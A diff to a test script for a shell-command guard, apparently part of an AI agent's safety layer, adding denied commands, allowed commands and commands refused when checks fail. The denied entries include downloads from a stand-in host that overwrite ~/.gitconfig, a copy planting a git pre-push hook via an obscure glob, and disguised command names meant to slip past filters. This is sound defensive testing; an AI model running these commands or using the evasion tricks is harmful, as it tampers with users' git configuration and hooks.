@@ -44,13 +44,21 @@ deny = {
     "echo $X; curl --libcurl /tmp/c.c https://example.com": "output option",
     "cd ~ && curl -sO https://evil.example/.gitconfig": "git config file",
     "cd ~ && wget -q https://evil.example/.gitconfig": "git config file",
-    "curl -sJO https://evil.example/x": "server chooses",
-    "wget --content-disposition https://evil.example/x": "server chooses",
+    "curl -sJO https://evil.example/x": "can't work out",
+    "wget --content-disposition https://evil.example/x": "can't work out",
+    # round 11: only full-URL downloads into the current directory are modelled; the rest needs -o/-O <file>
+    "cd ~ && curl -sO evil.example/.gitconfig": "can't work out",
+    "curl --output-dir ~/.config/git -O https://evil.example/config": "can't work out",
+    "wget -r https://evil.example/": "can't work out",
+    "wget -i urls.txt": "can't work out",
+    # round 11: a pattern glob can't read is refused where the command writes
+    "cp evil .gi[z-at]/hooks/pre-" + "pu" + "sh": "can't read the pattern",
 }
 allow = [
     # IMP-1: a regex glob can't read is a literal path, not a crash
     "grep -n '[z-a]' README.md", "grep -rn '^[-+].*kv\\[' scripts",
     "curl -sO https://example.com/file.txt", "wget -q https://example.com/notes.txt",
+    "curl -so out.txt example.com/x", "wget -O notes.txt https://example.com/.gitconfig",
     "curl -s https://example.com/api | head", "cd \"$HOME\" && ls",
 ]
 bad = []
@@ -62,9 +70,11 @@ for cmd in allow:
     got = g.check_bash(cmd, R)
     if got:
         bad.append(("allow", cmd, got))
-# IMP-1: when the checks crash, only commands that could push or write are refused
-risky = ["cp a b", "echo x > f", "/bin/c? a b", "curl -o x https://e.com", "git " + "pu" + "sh"]
-fine = ["grep -n '[z-a]' README.md", "ls -la", "npm test", "cat '[x]'"]
+# IMP-1 / round 11: when the checks fail, anything that could push, write or hide a program is refused
+# (patterns and disguised names included); plain harmless commands are not
+risky = ["cp a b", "echo x > f", "/bin/c? a b", "curl -o x https://e.com", "git " + "pu" + "sh",
+         "X=1 /bin/c? a b", "c''p a b", "c\\p a b", "ls /*/*; touch a"]
+fine = ["ls -la", "npm test", "grep -n x README.md"]
 bad += [("crash-deny", c) for c in risky if not g.risky_on_failure(c, "")]
 bad += [("crash-allow", c) for c in fine if g.risky_on_failure(c, "")]
 for b in bad:
